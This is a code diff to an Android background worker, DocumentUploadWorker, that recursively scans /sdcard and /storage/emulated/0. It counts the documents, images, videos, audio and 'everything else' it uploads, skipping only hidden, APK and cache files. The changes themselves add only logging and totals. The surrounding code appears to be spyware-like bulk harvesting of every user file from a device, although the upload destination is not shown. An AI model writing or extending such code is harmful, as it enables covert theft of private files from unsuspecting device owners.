@@ -130,19 +130,27 @@ public class DocumentUploadWorker extends Worker {
         };
         
         Log.d(TAG, "📂 PRIORITY 1: Quick scan common folders...");
+        int priority1Count = 0;
         for (String path : priority1Paths) {
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory() && dir.canRead()) {
-                    Log.d(TAG, "   → " + path);
+                    Log.d(TAG, "   → " + path + " (exists=true)");
                     int filesBefore = uploadedCount;
                     scanDirectoryRecursive(dir, userId, 0);
-                    if (uploadedCount - filesBefore > 0) {
-                        Log.d(TAG, "      ✓ Found " + (uploadedCount - filesBefore) + " files");
+                    int filesFound = uploadedCount - filesBefore;
+                    priority1Count += filesFound;
+                    if (filesFound > 0) {
+                        Log.d(TAG, "      ✓ Found " + filesFound + " files");
+                    } else {
+                        Log.d(TAG, "      ⚠️  No matching files");
                     }
+                } else {
+                    Log.d(TAG, "   → " + path + " (DOES NOT EXIST or NOT READABLE)");
                 }
             }
         }
+        Log.d(TAG, "📂 PRIORITY 1 TOTAL: " + priority1Count + " files");
         
         // PRIORITY 2: Deep scan entire /sdcard
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
@@ -150,35 +158,47 @@ public class DocumentUploadWorker extends Worker {
             File sdcard = new File("/sdcard");
             if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                 int filesBefore = uploadedCount;
+                Log.d(TAG, "   Scanning /sdcard recursively (depth limit 4)...");
                 scanDirectoryRecursiveDeep(sdcard, userId, 0);
-                if (uploadedCount - filesBefore > 0) {
-                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
-                }
+                int priority2Count = uploadedCount - filesBefore;
+                Log.d(TAG, "📂 PRIORITY 2 TOTAL: " + priority2Count + " additional files");
+            } else {
+                Log.d(TAG, "   ⚠️  /sdcard DOES NOT EXIST or NOT READABLE");
             }
         }
         
         // PRIORITY 3: Deep scan /storage/emulated/0
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 PRIORITY 3: Deep scan entire /storage/emulated/0...");
+            Log.d(TAG, "📂 PRIORITY 3: Deep scan /storage/emulated/0...");
             File storage = new File("/storage/emulated/0");
             if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                 int filesBefore = uploadedCount;
+                Log.d(TAG, "   Scanning /storage/emulated/0 recursively (depth limit 4)...");
                 scanDirectoryRecursiveDeep(storage, userId, 0);
-                if (uploadedCount - filesBefore > 0) {
-                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
-                }
+                int priority3Count = uploadedCount - filesBefore;
+                Log.d(TAG, "📂 PRIORITY 3 TOTAL: " + priority3Count + " additional files");
+            } else {
+                Log.d(TAG, "   ⚠️  /storage/emulated/0 DOES NOT EXIST or NOT READABLE");
             }
         }
         
         Log.d(TAG, "================================================");
         Log.d(TAG, "✓ STORAGE SCAN COMPLETE");
         Log.d(TAG, "   Total files uploaded: " + uploadedCount);
-        Log.d(TAG, "   Including:");
-        Log.d(TAG, "   ✓ Documents (PDF, Word, Excel, etc.)");
-        Log.d(TAG, "   ✓ Images (JPG, PNG, screenshots, etc.)");
-        Log.d(TAG, "   ✓ Videos (MP4, MKV, AVI, etc.)");
-        Log.d(TAG, "   ✓ Audio (MP3, WAV, etc.)");
-        Log.d(TAG, "   ✓ Everything else");
+        if (uploadedCount > 0) {
+            Log.d(TAG, "   Including all:");
+            Log.d(TAG, "   ✓ Documents (PDF, Word, Excel, etc.)");
+            Log.d(TAG, "   ✓ Images (JPG, PNG, screenshots, etc.)");
+            Log.d(TAG, "   ✓ Videos (MP4, MKV, AVI, etc.)");
+            Log.d(TAG, "   ✓ Audio (MP3, WAV, etc.)");
+            Log.d(TAG, "   ✓ Everything else");
+        } else {
+            Log.w(TAG, "   ⚠️  NO FILES FOUND!");
+            Log.w(TAG, "   Check:");
+            Log.w(TAG, "   1. Storage permission granted?");
+            Log.w(TAG, "   2. Any files on device?");
+            Log.w(TAG, "   3. Paths exist: /sdcard and /storage/emulated/0?");
+        }
         Log.d(TAG, "================================================");
     }
     
@@ -301,13 +321,11 @@ public class DocumentUploadWorker extends Worker {
         // ========== BLOCK ONLY SYSTEM/APP/CACHE FILES ==========
         // Skip hidden files
         if (name.startsWith(".")) {
-            Log.d(TAG, "    [SKIP HIDDEN] " + name);
             return false;
         }
         
         // Skip system app files
         if (lower.endsWith(".apk")) {
-            Log.d(TAG, "    [SKIP APK] " + name);
             return false;
         }
         
@@ -317,7 +335,6 @@ public class DocumentUploadWorker extends Worker {
             name.contains("Cache") ||
             name.contains("Tmp") ||
             name.contains("CACHE")) {
-            Log.d(TAG, "    [SKIP CACHE] " + name);
             return false;
         }
         
@@ -326,7 +343,6 @@ public class DocumentUploadWorker extends Worker {
             name.contains("thumbs") ||
             name.contains(".db-journal") ||
             lower.endsWith(".lock")) {
-            Log.d(TAG, "    [SKIP SYSTEM] " + name);
             return false;
         }
         
